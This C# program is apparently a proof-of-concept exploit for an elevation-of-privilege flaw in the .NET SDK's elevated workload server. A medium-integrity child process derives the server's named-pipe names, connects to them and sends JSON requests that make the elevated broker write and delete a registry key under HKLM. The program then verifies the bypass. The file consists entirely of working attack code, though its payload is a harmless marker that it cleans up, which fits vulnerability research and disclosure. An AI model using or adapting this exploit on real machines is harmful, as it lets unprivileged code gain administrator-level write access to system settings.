using System.Diagnostics;
using System.IO.Hashing;
using System.IO.Pipes;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.Json;
using Microsoft.Win32;

internal static class Program
{
    private const string MarkerWorkload = "research.pipe-hijack.marker";
    private const string FeatureBand = "10.0.100";

    public static async Task<int> Main(string[] args)
    {
        if (!OperatingSystem.IsWindows())
        {
            Console.WriteLine("WINDOWS_ONLY=True");
            return 0;
        }

        if (args.Length > 0 && args[0] == "attacker")
        {
            if (args.Length >= 4)
            {
                var evidenceWriter = new StreamWriter(args[3], append: true) { AutoFlush = true };
                Console.SetOut(evidenceWriter);
                Console.SetError(evidenceWriter);
            }

            return await RunAttackerAsync(
                serverPid: int.Parse(args[1]),
                expectedParentPid: int.Parse(args[2]));
        }

        return await RunParentAsync();
    }

    private static async Task<int> RunParentAsync()
    {
        using WindowsIdentity identity = WindowsIdentity.GetCurrent();
        bool isAdmin = new WindowsPrincipal(identity).IsInRole(WindowsBuiltInRole.Administrator);
        Console.WriteLine($"PARENT_PID={Environment.ProcessId}");
        Console.WriteLine($"PARENT_SID={identity.User?.Value}");
        Console.WriteLine($"PARENT_IS_ADMIN={isAdmin}");
        Console.WriteLine($"DOTNET_PATH={Environment.ProcessPath}");
        Console.WriteLine($"RUNTIME={RuntimeInformation.FrameworkDescription}");

        if (!isAdmin)
        {
            Console.WriteLine("PROBE_SKIPPED_NOT_ADMIN=True");
            return 2;
        }

        string dotnet = Environment.ProcessPath
            ?? throw new InvalidOperationException("Environment.ProcessPath unavailable.");
        string dll = Assembly.GetExecutingAssembly().Location;
        string clientTemp = Path.GetFullPath(Path.GetTempPath()).TrimEnd(Path.DirectorySeparatorChar);

        var serverStart = new ProcessStartInfo
        {
            FileName = dotnet,
            Arguments = $"workload elevate --client-temp \"{clientTemp}\"",
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true,
        };

        using Process server = Process.Start(serverStart)
            ?? throw new InvalidOperationException("Failed to start workload elevate server.");

        Console.WriteLine($"SERVER_PID={server.Id}");

        string evidencePath = Path.Combine(Path.GetTempPath(), $"sdk-pipe-medium-{Guid.NewGuid():N}.txt");
        int attackerExit = await LaunchMediumIntegrityAttackerAsync(
            dotnet,
            dll,
            server.Id,
            Environment.ProcessId,
            evidencePath);

        string attackerStdout = File.Exists(evidencePath)
            ? await File.ReadAllTextAsync(evidencePath)
            : string.Empty;

        Console.WriteLine("=== ATTACKER EVIDENCE ===");
        Console.Write(attackerStdout);
        Console.WriteLine($"ATTACKER_EXIT={attackerExit}");

        try { File.Delete(evidencePath); } catch { }

        if (!server.HasExited)
        {
            if (!server.WaitForExit(5000))
            {
                server.Kill(entireProcessTree: true);
                await server.WaitForExitAsync();
            }
        }

        string serverStdout = await server.StandardOutput.ReadToEndAsync();
        string serverStderr = await server.StandardError.ReadToEndAsync();
        Console.WriteLine("=== SERVER STDOUT ===");
        Console.Write(serverStdout);
        Console.WriteLine("=== SERVER STDERR ===");
        Console.Write(serverStderr);
        Console.WriteLine($"SERVER_EXIT={server.ExitCode}");

        bool confirmed =
            attackerStdout.Contains("ATTACKER_INTEGRITY_SID=S-1-16-8192", StringComparison.Ordinal) &&
            attackerStdout.Contains("ATTACKER_DIRECT_HKLM_WRITE_ALLOWED=False", StringComparison.Ordinal) &&
            attackerStdout.Contains("DISPATCH_PIPE_CONNECTED_BY_NON_PARENT=True", StringComparison.Ordinal) &&
            attackerStdout.Contains("HKLM_MARKER_CREATED=True", StringComparison.Ordinal) &&
            attackerStdout.Contains("HKLM_MARKER_CLEANED=True", StringComparison.Ordinal) &&
            attackerStdout.Contains("ELEVATED_BROKER_MEDIUM_IL_BYPASS=CONFIRMED", StringComparison.Ordinal);

        Console.WriteLine($"SDK_WORKLOAD_PIPE_MEDIUM_IL_EOP={(confirmed ? "CONFIRMED" : "NOT_CONFIRMED")}");
        return confirmed ? 0 : 1;
    }

    private static async Task<int> RunAttackerAsync(int serverPid, int expectedParentPid)
    {
        using WindowsIdentity identity = WindowsIdentity.GetCurrent();
        Console.WriteLine($"EXPECTED_PARENT_PID={expectedParentPid}");
        Console.WriteLine($"ATTACKER_PID={Environment.ProcessId}");
        Console.WriteLine($"ATTACKER_SID={identity.User?.Value}");
        Console.WriteLine($"ATTACKER_DIFFERS_FROM_PARENT={Environment.ProcessId != expectedParentPid}");
        Console.WriteLine($"ATTACKER_INTEGRITY_SID={GetCurrentIntegritySid()}");
        Console.WriteLine($"ATTACKER_IS_ADMIN={new WindowsPrincipal(identity).IsInRole(WindowsBuiltInRole.Administrator)}");

        string architecture = RuntimeInformation.ProcessArchitecture.ToString().ToLowerInvariant();
        string directMarkerPath = $@"SOFTWARE\Microsoft\dotnet\InstalledWorkloads\Standalone\{architecture}\{FeatureBand}\research.pipe-hijack.direct-attacker";
        bool directWriteAllowed = false;
        try
        {
            using RegistryKey? direct = Registry.LocalMachine.CreateSubKey(directMarkerPath, writable: true);
            directWriteAllowed = direct is not null;
            if (directWriteAllowed)
            {
                Registry.LocalMachine.DeleteSubKeyTree(directMarkerPath, throwOnMissingSubKey: false);
            }
        }
        catch (Exception ex) when (ex is UnauthorizedAccessException or System.Security.SecurityException)
        {
        }
        Console.WriteLine($"ATTACKER_DIRECT_HKLM_WRITE_ALLOWED={directWriteAllowed}");

        string dispatchPipeName = CreatePipeName(serverPid);
        string logPipeName = CreatePipeName(serverPid, "log");
        Console.WriteLine($"DISPATCH_PIPE={dispatchPipeName}");
        Console.WriteLine($"LOG_PIPE={logPipeName}");

        using var dispatch = new NamedPipeClientStream(".", dispatchPipeName, PipeDirection.InOut, PipeOptions.Asynchronous);
        using var log = new NamedPipeClientStream(".", logPipeName, PipeDirection.InOut, PipeOptions.Asynchronous);

        using var cts = new CancellationTokenSource();
        Task dispatchConnect = dispatch.ConnectAsync(cts.Token);
        Task logConnect = log.ConnectAsync(cts.Token);
        Task connectAll = Task.WhenAll(dispatchConnect, logConnect);
        if (await Task.WhenAny(connectAll, Task.Delay(TimeSpan.FromSeconds(10))) != connectAll)
        {
            cts.Cancel();
            Console.WriteLine($"DISPATCH_PIPE_CONNECTED={dispatch.IsConnected}");
            Console.WriteLine($"LOG_PIPE_CONNECTED={log.IsConnected}");
            Console.WriteLine("PIPE_CONNECT_TIMEOUT=True");
            return 3;
        }
        await connectAll;

        Console.WriteLine("DISPATCH_PIPE_CONNECTED_BY_NON_PARENT=True");
        Console.WriteLine("LOG_PIPE_CONNECTED_BY_NON_PARENT=True");

        using var logDrainCts = new CancellationTokenSource();
        Task logDrain = DrainLogAsync(log, logDrainCts.Token);

        string markerPath = $@"SOFTWARE\Microsoft\dotnet\InstalledWorkloads\Standalone\{architecture}\{FeatureBand}\{MarkerWorkload}";

        try
        {
            string writeResponse = await SendRequestAsync(dispatch, new
            {
                WorkloadId = MarkerWorkload,
                RequestType = 400,
                SdkFeatureBand = FeatureBand,
            });
            Console.WriteLine($"WRITE_RESPONSE={writeResponse}");

            bool created = Registry.LocalMachine.OpenSubKey(markerPath) is RegistryKey;
            Console.WriteLine($"HKLM_MARKER_PATH={markerPath}");
            Console.WriteLine($"HKLM_MARKER_CREATED={created}");

            string deleteResponse = await SendRequestAsync(dispatch, new
            {
                WorkloadId = MarkerWorkload,
                RequestType = 401,
                SdkFeatureBand = FeatureBand,
            });
            Console.WriteLine($"DELETE_RESPONSE={deleteResponse}");

            bool cleaned = Registry.LocalMachine.OpenSubKey(markerPath) is null;
            Console.WriteLine($"HKLM_MARKER_CLEANED={cleaned}");

            string shutdownResponse = await SendRequestAsync(dispatch, new { RequestType = 0 });
            Console.WriteLine($"SHUTDOWN_RESPONSE={shutdownResponse}");

            bool confirmed =
                Environment.ProcessId != expectedParentPid &&
                GetCurrentIntegritySid() == "S-1-16-8192" &&
                !directWriteAllowed &&
                created &&
                cleaned;
            Console.WriteLine($"ELEVATED_BROKER_MEDIUM_IL_BYPASS={(confirmed ? "CONFIRMED" : "NOT_CONFIRMED")}");
            return confirmed ? 0 : 1;
        }
        finally
        {
            logDrainCts.Cancel();
            try { await logDrain; } catch { }

            // Best-effort cleanup if the delete request did not complete.
            try
            {
                using RegistryKey? parent = Registry.LocalMachine.OpenSubKey(
                    $@"SOFTWARE\Microsoft\dotnet\InstalledWorkloads\Standalone\{architecture}\{FeatureBand}",
                    writable: true);
                parent?.DeleteSubKeyTree(MarkerWorkload, throwOnMissingSubKey: false);
            }
            catch
            {
            }
        }
    }

    private static async Task<string> SendRequestAsync(NamedPipeClientStream pipe, object request)
    {
        byte[] payload = JsonSerializer.SerializeToUtf8Bytes(request);
        byte[] header = BitConverter.GetBytes(payload.Length);
        byte[] framed = new byte[header.Length + payload.Length];
        Buffer.BlockCopy(header, 0, framed, 0, header.Length);
        Buffer.BlockCopy(payload, 0, framed, header.Length, payload.Length);
        // SDK PipeStreamMessageDispatcherBase performs one Read() per named-pipe message,
        // so the length prefix and JSON payload must be emitted as one message.
        await pipe.WriteAsync(framed);
        await pipe.FlushAsync();

        byte[] lengthBytes = new byte[4];
        await ReadExactlyAsync(pipe, lengthBytes);
        int length = BitConverter.ToInt32(lengthBytes, 0);
        if (length < 0 || length > 2044)
        {
            throw new InvalidDataException($"Unexpected response length: {length}");
        }

        byte[] response = new byte[length];
        await ReadExactlyAsync(pipe, response);
        return Encoding.UTF8.GetString(response);
    }

    private static async Task ReadExactlyAsync(Stream stream, byte[] buffer)
    {
        int read = 0;
        while (read < buffer.Length)
        {
            int n = await stream.ReadAsync(buffer.AsMemory(read));
            if (n == 0)
            {
                throw new EndOfStreamException();
            }
            read += n;
        }
    }

    private static async Task DrainLogAsync(Stream stream, CancellationToken cancellationToken)
    {
        byte[] buffer = new byte[4096];
        try
        {
            while (!cancellationToken.IsCancellationRequested)
            {
                int read = await stream.ReadAsync(buffer, cancellationToken);
                if (read == 0)
                {
                    return;
                }
                Console.WriteLine($"LOG_BYTES_DRAINED={read}");
            }
        }
        catch (Exception ex) when (ex is OperationCanceledException or IOException or ObjectDisposedException)
        {
        }
    }

    private static string CreatePipeName(int processId, params string[] values)
    {
        string processPath = (Environment.ProcessPath
            ?? throw new InvalidOperationException("Environment.ProcessPath unavailable.")).ToLowerInvariant();

        string mac = GetMacAddress()
            ?? throw new InvalidOperationException("No usable MAC address found.");

        string hashedMac = Convert.ToHexStringLower(SHA256.HashData(Encoding.UTF8.GetBytes(mac)));
        string name = $"{processId};{processPath};{hashedMac};{string.Join(";", values)}";
        return CreateUuid(name).ToString("B");
    }

    private static string? GetMacAddress()
    {
        return NetworkInterface.GetAllNetworkInterfaces()
            .Where(nic => nic.NetworkInterfaceType != NetworkInterfaceType.Loopback &&
                          nic.NetworkInterfaceType != NetworkInterfaceType.Tunnel)
            .Select(nic => nic.GetPhysicalAddress().GetAddressBytes())
            .Where(bytes => bytes.Length == 6 && bytes.Any(b => b != 0))
            .Select(bytes => string.Join("-", bytes.Select(b => b.ToString("X2"))))
            .FirstOrDefault();
    }

    private static Guid CreateUuid(string name)
    {
        Guid namespaceId = new("28F1468D-672B-489A-8E0C-7C5B3030630C");
        byte[] nameBytes = Encoding.UTF8.GetBytes(name);
        byte[] namespaceBytes = namespaceId.ToByteArray();

        SwapGuidByteOrder(namespaceBytes);

        byte[] streamToHash = new byte[namespaceBytes.Length + nameBytes.Length];
        Array.Copy(namespaceBytes, streamToHash, namespaceBytes.Length);
        Array.Copy(nameBytes, 0, streamToHash, namespaceBytes.Length, nameBytes.Length);

        byte[] hashResult = XxHash128.Hash(streamToHash);
        byte[] result = new byte[16];
        Array.Copy(hashResult, result, result.Length);

        result[6] = (byte)(0x80 | (result[6] & 0x0F));
        result[8] = (byte)(0x40 | (result[8] & 0x3F));
        SwapGuidByteOrder(result);

        return new Guid(result);
    }

    private static void SwapGuidByteOrder(byte[] b)
    {
        Swap(b, 0, 3);
        Swap(b, 1, 2);
        Swap(b, 5, 6);
        Swap(b, 7, 8);
    }

    private static void Swap(byte[] b, int x, int y)
        => (b[x], b[y]) = (b[y], b[x]);
    private static async Task<int> LaunchMediumIntegrityAttackerAsync(
        string dotnet,
        string dll,
        int serverPid,
        int expectedParentPid,
        string evidencePath)
    {
        const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        const uint TOKEN_DUPLICATE = 0x0002;
        const uint TOKEN_QUERY = 0x0008;
        const uint TOKEN_ADJUST_DEFAULT = 0x0080;
        const uint TOKEN_ADJUST_SESSIONID = 0x0100;
        const uint DISABLE_MAX_PRIVILEGE = 0x00000001;
        const uint SE_GROUP_USE_FOR_DENY_ONLY = 0x00000010;
        const uint SE_GROUP_INTEGRITY = 0x00000020;
        const uint CREATE_NO_WINDOW = 0x08000000;
        const uint LOGON_WITH_PROFILE = 0x00000001;

        uint desired = TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID;
        if (!OpenProcessToken(Process.GetCurrentProcess().Handle, desired, out IntPtr currentToken))
        {
            throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "OpenProcessToken failed");
        }

        IntPtr adminSidPtr = IntPtr.Zero;
        IntPtr mediumSidPtr = IntPtr.Zero;
        IntPtr tmlPtr = IntPtr.Zero;
        IntPtr restrictedToken = IntPtr.Zero;

        try
        {
            var adminSid = new SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, null);
            byte[] adminSidBytes = new byte[adminSid.BinaryLength];
            adminSid.GetBinaryForm(adminSidBytes, 0);
            adminSidPtr = Marshal.AllocHGlobal(adminSidBytes.Length);
            Marshal.Copy(adminSidBytes, 0, adminSidPtr, adminSidBytes.Length);

            var disable = new[]
            {
                new SID_AND_ATTRIBUTES
                {
                    Sid = adminSidPtr,
                    Attributes = SE_GROUP_USE_FOR_DENY_ONLY
                }
            };

            if (!CreateRestrictedToken(
                currentToken,
                DISABLE_MAX_PRIVILEGE,
                (uint)disable.Length,
                disable,
                0,
                IntPtr.Zero,
                0,
                IntPtr.Zero,
                out restrictedToken))
            {
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "CreateRestrictedToken failed");
            }

            var mediumSid = new SecurityIdentifier("S-1-16-8192");
            byte[] mediumSidBytes = new byte[mediumSid.BinaryLength];
            mediumSid.GetBinaryForm(mediumSidBytes, 0);
            mediumSidPtr = Marshal.AllocHGlobal(mediumSidBytes.Length);
            Marshal.Copy(mediumSidBytes, 0, mediumSidPtr, mediumSidBytes.Length);

            var tml = new TOKEN_MANDATORY_LABEL
            {
                Label = new SID_AND_ATTRIBUTES
                {
                    Sid = mediumSidPtr,
                    Attributes = SE_GROUP_INTEGRITY
                }
            };
            tmlPtr = Marshal.AllocHGlobal(Marshal.SizeOf<TOKEN_MANDATORY_LABEL>());
            Marshal.StructureToPtr(tml, tmlPtr, false);

            if (!SetTokenInformation(
                restrictedToken,
                TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,
                tmlPtr,
                Marshal.SizeOf<TOKEN_MANDATORY_LABEL>() + mediumSidBytes.Length))
            {
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "SetTokenInformation(TokenIntegrityLevel) failed");
            }

            string args = $"\"{dll}\" attacker {serverPid} {expectedParentPid} \"{evidencePath}\"";
            var commandLine = new StringBuilder($"\"{dotnet}\" {args}");
            STARTUPINFO si = new() { cb = Marshal.SizeOf<STARTUPINFO>() };

            if (!CreateProcessWithTokenW(
                restrictedToken,
                LOGON_WITH_PROFILE,
                dotnet,
                commandLine,
                CREATE_NO_WINDOW,
                IntPtr.Zero,
                Path.GetDirectoryName(dll),
                ref si,
                out PROCESS_INFORMATION pi))
            {
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "CreateProcessWithTokenW failed");
            }

            try
            {
                using Process child = Process.GetProcessById((int)pi.dwProcessId);
                await child.WaitForExitAsync();
                return child.ExitCode;
            }
            finally
            {
                if (pi.hThread != IntPtr.Zero) CloseHandle(pi.hThread);
                if (pi.hProcess != IntPtr.Zero) CloseHandle(pi.hProcess);
            }
        }
        finally
        {
            if (restrictedToken != IntPtr.Zero) CloseHandle(restrictedToken);
            if (currentToken != IntPtr.Zero) CloseHandle(currentToken);
            if (tmlPtr != IntPtr.Zero) Marshal.FreeHGlobal(tmlPtr);
            if (mediumSidPtr != IntPtr.Zero) Marshal.FreeHGlobal(mediumSidPtr);
            if (adminSidPtr != IntPtr.Zero) Marshal.FreeHGlobal(adminSidPtr);
        }
    }

    private static string GetCurrentIntegritySid()
    {
        const uint TOKEN_QUERY = 0x0008;
        if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_QUERY, out IntPtr token))
        {
            throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
        }

        try
        {
            _ = GetTokenInformation(token, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, IntPtr.Zero, 0, out int length);
            int error = Marshal.GetLastWin32Error();
            if (length <= 0)
            {
                throw new System.ComponentModel.Win32Exception(error);
            }

            IntPtr buffer = Marshal.AllocHGlobal(length);
            try
            {
                if (!GetTokenInformation(token, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, buffer, length, out _))
                {
                    throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
                }

                TOKEN_MANDATORY_LABEL label = Marshal.PtrToStructure<TOKEN_MANDATORY_LABEL>(buffer);
                return new SecurityIdentifier(label.Label.Sid).Value;
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }
        finally
        {
            CloseHandle(token);
        }
    }

    private enum TOKEN_INFORMATION_CLASS
    {
        TokenIntegrityLevel = 25
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SID_AND_ATTRIBUTES
    {
        public IntPtr Sid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct TOKEN_MANDATORY_LABEL
    {
        public SID_AND_ATTRIBUTES Label;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct STARTUPINFO
    {
        public int cb;
        public string? lpReserved;
        public string? lpDesktop;
        public string? lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool OpenProcessToken(
        IntPtr ProcessHandle,
        uint DesiredAccess,
        out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CreateRestrictedToken(
        IntPtr ExistingTokenHandle,
        uint Flags,
        uint DisableSidCount,
        [In] SID_AND_ATTRIBUTES[] SidsToDisable,
        uint DeletePrivilegeCount,
        IntPtr PrivilegesToDelete,
        uint RestrictedSidCount,
        IntPtr SidsToRestrict,
        out IntPtr NewTokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool SetTokenInformation(
        IntPtr TokenHandle,
        TOKEN_INFORMATION_CLASS TokenInformationClass,
        IntPtr TokenInformation,
        int TokenInformationLength);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool GetTokenInformation(
        IntPtr TokenHandle,
        TOKEN_INFORMATION_CLASS TokenInformationClass,
        IntPtr TokenInformation,
        int TokenInformationLength,
        out int ReturnLength);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CreateProcessWithTokenW(
        IntPtr hToken,
        uint dwLogonFlags,
        string? lpApplicationName,
        StringBuilder lpCommandLine,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string? lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CloseHandle(IntPtr hObject);

}
